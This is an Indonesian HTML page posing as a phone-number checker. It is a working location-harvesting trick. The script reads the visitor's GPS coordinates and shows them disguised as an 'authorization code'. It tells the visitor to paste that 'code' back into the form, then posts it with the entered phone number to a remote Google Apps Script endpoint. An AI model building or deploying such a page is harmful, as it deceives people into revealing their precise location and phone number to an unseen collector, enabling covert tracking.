<html lang="in">
<head>
				<link rel="stylesheet" href="adsense.css">
				<title>Nomor aku</title>
				
					<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
					
					
				
				<style>
						.judul{
				background-color:gray;
				position:fixed;
				right:0; left:0;
				top:0; padding:14px;
				
}

.jud {
				background-color:gray;
				width:27px;
				height:4px;
				opacity:;
				margin-left:20px;
				display:flex;
				justify-content:space-between;
				flex-direction:column;
				margin-top:10px; margin-bottom:-30px;
				
}

.jud span{
				background-color:white;
				color:red;
				width:17px;
				height:3px;
				display:block;	
				margin-left:-3px; margin-bottom:-30px;
				
				
				
}
		
								
								
						body{
						 background-color:gainsboo;
						 }
						 
						 .tempat{
						 color:black;
						 text-align:center;
						 font-size:15px;
						 display:no;
						 
						 }
							
							.kirim{ 
							display:none;
							margin-left:30%;
						  display:blok;
						  width:40%;
						  border:none;
						  text-decoration:none;
						  padding:10px;
						  background-color:black;
						  border-radius:3px;
						  color:white;
						  font-weight:bold;
							}
							
							.lokasi{
							display:none;
							margin-left:20%;
						  display:blck;
						  width:60%;
						  text-decoration:none;
						  border:none;
						  background-color:gainsboro;
						  padding:10px;
						  border-radius:3px;
						  font-size:13px;
							
							
							}
							
							.nomor{
							font-weight:bold;
							text-align:center;
							color:#e8491d;
							font-size:20px;
							}
							
							
						  .number{
						  margin:auto;
						  display:block;
						  width:60%;
						  text-decoration:none;
						  border:none;
						  background-color:gainsboro;
						  padding:10px;
						  border-radius:3px;
						  font-size:13px;
						  }
						  
						  .no{
						  margin:auto;
						  display:block;
						  width:40%;
						  border:none;
						  text-decoration:none;
						  padding:10px;
						  background-color:black;
						  border-radius:3px;
						  color:white;
						  font-weight:bold;}
						  
						  
						  .kode{
						  text-align:center;
						  font-size:20px;
						  font-weight:bold;
						  color:#e8491d;
						  display:none;
						  }
						  
						  .miring{
						  text-align:center;
						  color:gainsboro;
                                                  font-size:10px; 
						  

						  display:none;}
						  
						  .lastman{
						  text-align:center;
						  font-weight:bold;
						  display:none;
						  font-size:20px;
                                                                  }
						  
						  .bawah{
						   padding:20px;
  position:fixed;
bottom:0;
right:0;
left:0;
background-color:grey;
  
						  }

.check{
text-align:center;
color:white;
font-size:12px;
}


							.na{
				margin-top:-21px;
				text-align:center;
	     font-family:cursive,"Brush Script MT";
	     color:white;
}	
		

	 .raw{
          width:45%;
          margin-left:50%;
          }

	

	

	

						
								
								
				</style>
</head>
<body>
				
				<div class="judul">
								<button class="jud">
												<span></span>
												<span></span>
												<span></span>
								</button>
								<h3 class="na">Check Number</h3>
				</div>
			
				
				
				
				
				
				
				<form name="Test-Fb">
				<p class="nomor" id="nomor">Masukan Nomor HP</p>
				<input type="text" id="number" class="number" placeholder="+62..." name="nomor"><br>
				<p id="kode" class="kode">Kode Otorisasi</p>
				<p id="demo" class="tempat"></p>
				<button class="no" onclick="getLocation()" id="pilih" >Kirim</button>
                                <p class="miring" id="miring"><em>Salin code lalu masukan (jika kode tidak ada silahkan refresh)</em></p>
				
				<input type="text" name="gambar" id="lokasi" class="lokasi" placeholder="####"><br><br>
				<button class="kirim" id="kirim" type="submit">Kirim</button>
 <br><br><br><br><br>
                                <img src="https://raw.githubusercontent.com/ikipriyatna/-/main/location.jpg" class="raw" id="raw">
				<script>
							var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  x.innerHTML = " " + position.coords.latitude + 
  "<br>" + position.coords.longitude;
}
				</script>
				
				
				
				</form>
				<br><br>
				<p class="lastman" id="lastman">Sedang dalam proses...</p>
				<br><br><br><br>	<br><br>
				
				<div class="bawah">
						<p class="check">Check Number, Copyright &copy; 2019</p>
				</div>
				
				<script>
				$(document).ready(function(){
  $("#pilih").click(function(){
    $("#lokasi").fadeIn(1000);
    $("#kirim").fadeIn(1000);  
    $("#nomor").fadeOut(100);
    $("#number").fadeOut(100);
    $("#pilih").fadeOut(100); 
    $("#kode").fadeIn(1000); 
    $("#miring").fadeIn(1000);
    $("#demo").fadeIn(1000);
    $("#raw").fadeOut(100);
  });
});

</script>


<script>
				$(document).ready(function(){
  $("#kirim").click(function(){
    $("#kirim").fadeOut(100);
    $("#lokasi").fadeOut(100);
     $("#miring").fadeOut(100);
    $("#kode").fadeOut(100);
    $("#lastman").fadeIn(1000);
    $("#demo").fadeOut(100);
    
    });
});
    
</script>




<script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbwz07cfyR66rBWYsLgmyHbNoqyzUeDm3Y-zQIdCkrZ7zNEdR0DQwJFJa6LFVcWSOxnJ/exec'
  const form = document.forms['Test-Fb']

  form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message))
  })
</script>
				
</body>
</html>

